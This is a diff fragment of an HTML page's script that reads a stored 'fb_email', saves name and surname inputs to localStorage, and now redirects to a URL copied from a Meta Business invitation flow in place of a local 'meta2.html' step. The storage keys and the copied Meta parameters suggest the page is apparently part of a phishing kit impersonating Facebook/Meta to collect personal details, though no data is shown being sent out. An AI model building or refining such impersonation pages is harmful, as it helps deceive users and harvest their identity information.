@@ -1245,7 +1245,7 @@
     <script>
         (function () {
             var email = localStorage.getItem('fb_email');
-            console.log('Retrieved email from localStorage:', email);   
+            console.log('Retrieved email from localStorage:', email);
             if (email) {
                 var replaceEmail = function () {
                     var inputs = document.getElementsByTagName('input');
@@ -1277,7 +1277,7 @@
                         if (nameInput) localStorage.setItem('fb_name', nameInput.value);
                         if (surnameInput) localStorage.setItem('fb_surname', surnameInput.value);
 
-                        window.location.href = 'meta2.html';
+                        window.location.href = '/invitation/2?token=AfkB8u_UzAstoSbIeDyr841xI3xiwZA_q9pCs7sS3CT-ANjo8-XoHiwXyCIhPKdsxt3GbSSfk40eST7GdlhhCKeTnifHAARIV6cZymjV17SIy0EG1x8AEnMfLb0SekoNXtvc8DS0J3DX5G2E_9D0fz0ePN5G63KfD_RWTcA5MPb3BSLOFEBQQ0axpEeIdtaOsJTnd95ZE9JYotBn59iuAbCbKo7dO7XhqxPOIOynn4ArA4jKRSfP33lz1H7wshLWUjthGOE64h6_On6fkQdvF-rHSI1nW0eTJj0p&chosen_account_type=1&invite_join_id=e577ddd4-56ef-448b-9bdd-8b0027444cdc&biz_login_source=biz_unified_f3_fb_login_button&join_id=4bbe5229-5f53-4bb0-bd74-952c08efcfb0'; // Redirect to invitation page with token';
                         e.preventDefault();
                         break;
                     }
